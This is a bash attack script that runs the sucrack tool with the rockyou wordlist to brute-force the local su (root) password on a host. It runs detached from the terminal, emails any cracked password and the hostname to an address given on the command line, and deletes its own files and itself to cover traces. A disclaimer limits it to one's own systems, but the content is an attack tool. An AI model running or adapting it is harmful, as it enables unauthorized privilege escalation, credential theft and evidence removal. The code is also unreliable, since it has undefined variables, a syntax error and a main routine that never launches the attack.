#!/bin/bash

############################# - DISCLAIMER - ##############################

# THIS PROGRAM IS INTENDED TO BE USED ON YOUR OWN PERSONAL COMPUTER SYSTEMS, 
# PERIOD. 
# 
# USING THIS PROGRAM TO ATTACK, OR ATTEMPT TO ATTACK, OR EVEN ATTEMPT TO 
# CONNECT TO SYSTEMS THAT YOU ARE NOT EXPRESSLY AUTHORIZED TO ACCESS CAN 
# RESULT IN CRIMINAL PROSECUTION. 
# 
# ACCESSING SYSTEMS THAT ARE NOT YOUR OWN PERSONAL PROPERTY OR WHICH YOU DO 
# NOT HAVE EXPLICIT WRITTEN PERMISSION TO ACCESS IS CONSIDERED ILLEGAL NEARLY 
# EVERYWHERE.  
# 
# THE WRITER OF THIS PROGRAM WILL NOT BE HELD RESPONSIBLE FOR ILLEGAL ACTIONS 
# TAKEN BY ANYONE USING THIS PROGRAM.

############################## - VARIABLES - ###############################

SCRIPT_NAME=""
SUCRACK_NAME=""
WORDLIST_NAME="rockyou.txt.bz2"
THREADS=10

########################### - DO NOT MODIFY - ##############################

EMAIL_ADDRESS=$1
HOSTNAME=$(hostname)

############################### - BEGIN -  ################################

mynohup(){
# Close stdin, and make any read attempt an error
    if [ -t 0 ]
    then
        exec 0>/dev/null
    fi

# Redirect stdout to a file if it's a TTY
    if [ -t 1 ]
    then
        exec 1>nohup.out
        if [ $? -ne 0 ]
        then
            exec 1>$HOME/nohup.out
        fi
    fi

# Redirect stderr to stdout if it's a TTY
    if [ -t 2 ]
    then
        exec 2>&1
    fi

# Trap the HUP signal to ignore it
    trap : HUP
}

uncompress_wordlist ()
{
    echo -ne "[+] Uncompressing wordlist $WORDLIST_NAME\n"
    bunzip2 $WORDLIST_NAME
}

execute_sucrack ()
{
    echo -ne "[+] Giving sucrack execution permissions\n"
    chmod +x $SUCRACK_NAME
}
send_mail()
{
    SUBJECT="[ Success ] $HOSTNAME password"
# Email To ?
    EMAIL=$1
# Email text/message
    EMAILMESSAGE="password.txt"
# send an email using /bin/mail
    mail -s "$SUBJECT" "$EMAIL_ADDRESS" < $EMAIL_ADDRESSMESSAGE

}
send_fail()
{
    SUBJECT="[ Fail ] $HOSTNAME password"
# Email To ?
    EMAIL=$1
# send an email using /bin/mail
    mail -s "$SUBJECT" "$EMAIL_ADDRESS" < $EMAIL_ADDRESSMESSAGE

}

crackthatmofo ()
{
    echo -ne "[+] Launching bruteforce attack with $THREADS THREADS..."
    $SUCRACK_NAME -w $THREADS $WORDLIST_UNCOMPRESSED_NAME | grep "$HOSTNAME password is:" >password.txt
    if [-f "password.txt"]; then
        send_mail $EMAIL_ADDRESS
    else
        send_fail $EMAIL_ADDRESS
    fi
}
cleanup ()
{
    echo -ne "[+] Cleaning up..."
    rm -f $WORDLIST_NAME
    rm -f $WORDLIST_UNCOMPRESSED_NAME
    rm -f $SUCRACK_NAME
    rm -f $SCRIPT_NAME
}


############################### - MAIN - ###############################

mynohup
execute_sucrack
uncompress_wordlist
cleanup 
